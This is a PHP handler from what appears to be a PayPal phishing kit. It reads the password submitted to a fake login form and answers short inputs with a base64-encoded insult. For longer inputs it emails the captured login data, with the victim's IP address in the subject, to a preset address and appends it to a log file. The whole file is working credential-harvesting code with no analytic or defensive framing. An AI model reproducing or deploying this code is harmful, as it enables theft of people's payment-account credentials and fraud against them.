<?php
session_start();
sleep(2);
include("mail.php");
$PW = $_POST['Spassword'];
if(strlen($PW)<6){
    echo "Y2hlY2t5b3VmdWNraW5ncGFzc3dvcmQ=";
}else{
    include("functionsend.php");
    $head = "MIME-Version: 1.0" . "\r\n";
    $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $head .= "From: $from\r\n";
    $subject = "New PayPal Login Form : ".getenv("REMOTE_ADDR");
    @mail($to,$subject,functionsend::Login(),$head);
    $f = fopen($save, "a+");
    fwrite($f, functionsend::Login());
    fclose($f);
}

?>